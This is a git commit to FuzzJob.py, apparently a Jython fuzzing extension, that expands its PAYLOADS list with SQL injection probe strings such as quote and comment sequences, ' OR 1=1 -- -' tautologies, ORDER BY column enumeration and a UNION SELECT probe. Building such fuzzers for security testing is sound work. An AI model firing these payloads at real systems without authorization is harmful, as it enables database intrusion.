f5a7bf365461da402d5e6ff71e0ec4931b59d275
Luca Reccia <lucareccia@hotmail.it>
2022-09-25 12:00:11 +0200

    added more payloads

--- FuzzJob.py
+++ FuzzJob.py
@@ -3,7 +3,7 @@ from java.net import URL
 from java.util import ArrayList;
 from threading import Lock
 
-PAYLOADS = ["--", "'"]
+PAYLOADS = ["--","'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "' or \"", "-- or # ", "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '", "'='", "'LIKE'", "'=0--+", " OR 1=1", "' OR 'x'='x", "' AND id IS NULL; --", "'''''''''''''UNION SELECT '2", "%00", "/*…*/ ", "+", "||", "%", " AND 1", " AND 0", " AND true", " AND false", "1-false", "1-true", "1*56", "-2", "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+", "1' ORDER BY 1,2--+", "1' ORDER BY 1,2,3--+", "1' GROUP BY 1,2,--+", "1' GROUP BY 1,2,3--+", "-1' UNION SELECT 1,2,3--+"]
 
 class FuzzJob:
     STATUS_ADDED = "added"
